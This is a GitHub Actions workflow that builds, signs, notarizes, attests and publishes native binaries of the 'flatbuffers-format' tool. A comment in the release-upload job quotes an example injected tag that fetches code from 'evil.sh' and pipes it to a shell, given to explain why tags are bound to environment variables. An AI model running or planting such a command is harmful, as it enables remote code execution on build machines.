# Build single-file native binaries of `flatbuffers-format` for every
# supported platform and upload them to the matching GitHub Release.
#
# Driven by Node 22's Single Executable Application feature
# (https://nodejs.org/api/single-executable-applications.html). The
# per-platform build logic lives in
# `flatbuffers-formatter/scripts/build-native.mjs`; this
# workflow just orchestrates the matrix.
#
# When this runs:
#   1. On every push to `main` that touches the engine or the build
#      script — produces "edge" artifacts uploaded to the workflow run
#      (useful for previewing without cutting a release).
#   2. On release-please cutting a new `flatbuffers-format@X.Y.Z` tag,
#      via the `released` event — uploads signed binaries to the
#      GitHub Release that release-please just created.
#
# Each platform binary ships with a `.sha256` sidecar. The IntelliJ
# plugin's bundled-engine downloader verifies the bytes against that
# sidecar before installing.
#
# macOS binaries are Developer-ID-signed and Apple-notarized when the
# `APPLE_*` secrets (cert, password, Apple ID, app-specific password,
# team ID) are configured. Without them the build falls back to an
# ad-hoc signature and downloaded copies hit Gatekeeper quarantine
# until the user clears it manually.
#
# We don't publish to a separate registry — the binaries are downloadable
# directly from GitHub Releases. Doc'd in the engine README.

name: native-binaries

on:
  push:
    branches:
      - main
    paths:
      - flatbuffers-formatter/src/**
      - flatbuffers-formatter/grammar/**
      - flatbuffers-formatter/scripts/build-native.mjs
      - .github/workflows/flatbuffers-native-binaries.yml
  release:
    types: [released]
  workflow_dispatch:
    inputs:
      tag:
        description: GitHub Release tag to upload to (e.g. flatbuffers-format@0.1.1)
        required: false
        type: string

# Least privilege at the top of the file; each job below asks for
# exactly the extra scopes it needs and nothing more.
permissions:
  contents: read

jobs:
  build:
    name: ${{ matrix.platform }}
    strategy:
      fail-fast: false
      matrix:
        include:
          - platform: linux-x64
            os: ubuntu-latest
            artifact: flatbuffers-format-linux-x64
          - platform: linux-arm64
            os: ubuntu-22.04-arm
            artifact: flatbuffers-format-linux-arm64
          - platform: macos-x64
            os: macos-13
            artifact: flatbuffers-format-macos-x64
          - platform: macos-arm64
            os: macos-14
            artifact: flatbuffers-format-macos-arm64
          - platform: windows-x64
            os: windows-2022
            artifact: flatbuffers-format-windows-x64.exe
    runs-on: ${{ matrix.os }}
    permissions:
      contents: read
      # SLSA build-provenance attestations (`actions/attest-build-provenance`)
      # need an OIDC token to sign with Sigstore Fulcio + write to the
      # repo's attestations API. The token expires when the job ends;
      # nothing persists in the repo beyond the attestation itself.
      id-token: write
      attestations: write
    # Hoist the Apple secrets to a job-level env so the `if:` on the
    # notarization step can check "are credentials present?" without
    # the disallowed `secrets.*` reference inside the conditional.
    env:
      HAS_APPLE_NOTARIZATION: ${{ secrets.APPLE_DEVELOPER_ID_CERT_P12_BASE64 != '' && 'true' || 'false' }}
    defaults:
      run:
        working-directory: flatbuffers-formatter
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false
      - uses: pnpm/action-setup@b906affcce14559ad1aafd4ab0e942779e9f58b1 # v4
        with:
          package_json_file: package.json
      # Deliberately NO dependency cache here. This job's output is
      # attested and attached to a GitHub Release, so a poisoned restore
      # would become the published binary. `package-manager-cache: false`
      # is required as well as dropping `cache:` — setup-node v7 turns
      # caching on by itself when package.json declares `packageManager`.
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7
        with:
          node-version: 22
          package-manager-cache: false
      - name: Install
        working-directory: .
        run: pnpm install --frozen-lockfile
      - name: Build
        working-directory: .
        run: pnpm --filter flatbuffers-format build

      # ── macOS: import Developer ID certificate into a temporary keychain
      #
      # This is the standard 2024+ pattern: a one-shot keychain that
      # lives only for the duration of this job. The certificate's
      # private key is unlocked, codesign uses it, then the keychain
      # is destroyed in the `Cleanup keychain` post-step. The
      # `KEYCHAIN_PASSWORD` is ephemeral (a fresh random per run) so
      # it doesn't need to be a secret.
      - name: Import Developer ID certificate (macOS)
        if: runner.os == 'macOS' && env.HAS_APPLE_NOTARIZATION == 'true'
        env:
          CERT_P12_BASE64: ${{ secrets.APPLE_DEVELOPER_ID_CERT_P12_BASE64 }}
          CERT_PASSWORD: ${{ secrets.APPLE_DEVELOPER_ID_CERT_PASSWORD }}
        run: |
          set -euo pipefail
          # Decode the .p12 from the base64-encoded secret.
          echo "$CERT_P12_BASE64" | base64 --decode > /tmp/cert.p12
          # Ephemeral keychain — fresh password per run.
          KEYCHAIN_PASSWORD=$(openssl rand -base64 24)
          echo "EPHEMERAL_KEYCHAIN_PASSWORD=$KEYCHAIN_PASSWORD" >> "$GITHUB_ENV"
          security create-keychain -p "$KEYCHAIN_PASSWORD" build.keychain
          security default-keychain -s build.keychain
          security unlock-keychain -p "$KEYCHAIN_PASSWORD" build.keychain
          security set-keychain-settings -lut 21600 build.keychain
          security import /tmp/cert.p12 \
            -k build.keychain \
            -P "$CERT_PASSWORD" \
            -T /usr/bin/codesign
          security set-key-partition-list \
            -S apple-tool:,apple: \
            -s -k "$KEYCHAIN_PASSWORD" \
            build.keychain
          rm -f /tmp/cert.p12
          # Extract the Developer ID identity string for codesign.
          identity=$(security find-identity -v -p codesigning build.keychain | grep "Developer ID Application" | head -1 | sed -E 's/.*"(.+)"$/\1/')
          if [ -z "$identity" ]; then
            echo "::error::No 'Developer ID Application' identity found in imported certificate."
            exit 1
          fi
          echo "Found identity: $identity"
          echo "DEVELOPER_ID=$identity" >> "$GITHUB_ENV"

      - name: Build native binary (signed)
        if: runner.os == 'macOS' && env.HAS_APPLE_NOTARIZATION == 'true'
        run: node scripts/build-native.mjs --developer-id "$DEVELOPER_ID"

      - name: Build native binary (unsigned / ad-hoc)
        if: runner.os != 'macOS' || env.HAS_APPLE_NOTARIZATION != 'true'
        run: node scripts/build-native.mjs

      # ── macOS notarization
      #
      # `xcrun notarytool submit --wait` blocks until Apple's notary
      # service finishes inspecting the bundle (~1-5 minutes
      # typically). After success, `stapler staple` attaches the
      # notarization ticket so the binary works offline (Gatekeeper
      # can verify locally without an Apple server round-trip).
      - name: Notarize + staple (macOS)
        if: runner.os == 'macOS' && env.HAS_APPLE_NOTARIZATION == 'true'
        env:
          APPLE_ID: ${{ secrets.APPLE_ID }}
          APPLE_ID_PASSWORD: ${{ secrets.APPLE_ID_APP_SPECIFIC_PASSWORD }}
          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
        run: |
          set -euo pipefail
          # notarytool only accepts .zip / .pkg / .dmg, not raw binaries.
          # Zip the binary just for the submission.
          ditto -c -k --keepParent build/native/flatbuffers-format /tmp/notarize.zip
          xcrun notarytool submit /tmp/notarize.zip \
            --apple-id "$APPLE_ID" \
            --password "$APPLE_ID_PASSWORD" \
            --team-id "$APPLE_TEAM_ID" \
            --wait
          # Stapling applies to the binary directly (not the zip).
          # SEA binaries are Mach-O; `stapler staple` works on them
          # because they're a valid signed bundle once codesigned
          # with --options=runtime.
          xcrun stapler staple build/native/flatbuffers-format || {
            echo "::warning::Stapling failed — binary is still notarized but Gatekeeper will need network to verify."
          }
          rm -f /tmp/notarize.zip

      # Smoke-test the binary before upload — catches injection problems
      # (postject silently producing a corrupt SEA, etc.) early.
      - name: Smoke-test (Unix)
        if: runner.os != 'Windows'
        run: |
          ./build/native/flatbuffers-format --version
          echo 'table T { x: int; }' | ./build/native/flatbuffers-format --check /dev/stdin || true
      - name: Smoke-test (Windows)
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          .\build\native\flatbuffers-format.exe --version

      - name: Rename + collect artifact + sidecar
        shell: bash
        run: |
          set -euo pipefail
          # Absolute workspace path: this step runs with a per-package
          # working-directory, so a relative ../.. would land outside the
          # checkout while the attest/upload steps below read from the
          # workspace root.
          staging="$GITHUB_WORKSPACE/_native-artifacts"
          mkdir -p "$staging"
          if [ "${{ runner.os }}" = "Windows" ]; then
            src=build/native/flatbuffers-format.exe
          else
            src=build/native/flatbuffers-format
          fi
          dst="$staging/${{ matrix.artifact }}"
          cp "$src" "$dst"
          # Re-compute the SHA over the renamed file — that's what
          # consumers download. The sidecar build-native.mjs emitted
          # is over the bare-filename version and would have the
          # wrong filename column for `sha256sum --check`.
          (
            cd "$staging"
            sha256sum "${{ matrix.artifact }}" > "${{ matrix.artifact }}.sha256"
          )

      # SLSA build-provenance attestation. Signed by Sigstore Fulcio
      # using the workflow's OIDC token; the attestation links the
      # downloaded artefact to this exact GitHub Actions run (commit
      # SHA, workflow file, runner identity). Consumers verify with:
      #   gh attestation verify <file> --repo emindeniz99/flatbuffers-format
      # We attest both the binary AND its SHA sidecar so the sidecar
      # itself becomes trustworthy (a tampered sidecar would either
      # have no attestation or one with a wrong subject hash).
      - name: Attest build provenance
        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4
        with:
          subject-path: |
            _native-artifacts/${{ matrix.artifact }}
            _native-artifacts/${{ matrix.artifact }}.sha256

      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: ${{ matrix.artifact }}
          path: |
            _native-artifacts/${{ matrix.artifact }}
            _native-artifacts/${{ matrix.artifact }}.sha256
          if-no-files-found: error
          retention-days: 30

      - name: Cleanup keychain (macOS)
        if: always() && runner.os == 'macOS' && env.HAS_APPLE_NOTARIZATION == 'true'
        run: |
          security delete-keychain build.keychain || true

  upload-to-release:
    name: Upload binaries to GitHub Release
    needs: build
    # Only attach to a release on the `release: released` event, OR on
    # a workflow_dispatch with an explicit tag. Push-to-main runs stop
    # at the artifact-upload step above — those are previews, not
    # releases.
    if: |
      github.event_name == 'release' ||
      (github.event_name == 'workflow_dispatch' && inputs.tag != '')
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false
      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
        with:
          path: _native-artifacts
          merge-multiple: true
      # A release tag name and a workflow_dispatch input are both
      # caller-supplied strings. Bind them to env vars instead of
      # splicing them into the shell source, so a tag like
      # `x"; curl evil.sh | sh; #` is inert data, not code.
      - name: Determine release tag
        id: tag
        env:
          EVENT_NAME: ${{ github.event_name }}
          RELEASE_TAG: ${{ github.event.release.tag_name }}
          INPUT_TAG: ${{ inputs.tag }}
        run: |
          if [ "$EVENT_NAME" = "release" ]; then
            echo "value=$RELEASE_TAG" >> "$GITHUB_OUTPUT"
          else
            echo "value=$INPUT_TAG" >> "$GITHUB_OUTPUT"
          fi
      - name: Upload to release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG: ${{ steps.tag.outputs.value }}
          REPO: ${{ github.repository }}
        run: |
          # Only upload to flatbuffers-format@* releases; other releases
          # (vscode-flatbuffers@*, tree-sitter-flatbuffers@*, etc.) get
          # nothing from this workflow.
          case "$TAG" in
            flatbuffers-format@*) ;;
            *) echo "Skipping: tag '$TAG' is not a flatbuffers-format release"; exit 0 ;;
          esac
          # Both the binary and its sidecar.
          for f in _native-artifacts/flatbuffers-format-*; do
            [ -f "$f" ] || continue
            echo "Uploading $f → $TAG"
            gh release upload "$TAG" "$f" --clobber --repo "$REPO"
          done
